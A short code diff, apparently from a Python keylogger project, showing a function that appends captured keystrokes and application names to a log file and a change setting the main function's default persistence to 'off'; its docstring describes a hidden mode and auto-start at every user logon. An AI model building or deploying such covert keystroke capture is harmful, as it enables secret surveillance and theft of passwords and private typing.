@@ -28,7 +28,7 @@ def key_log(key):
         lastappname=appname
     with open("key_logs.txt","a")as f:
         f.write(logs)
-def main(display="show",persistent="on"):
+def main(display="show",persistent="off"):
      """display=hide will run this logger as hidden
         persistence=on will make this keylogger as starts automatically when evertime user Logon 
      """
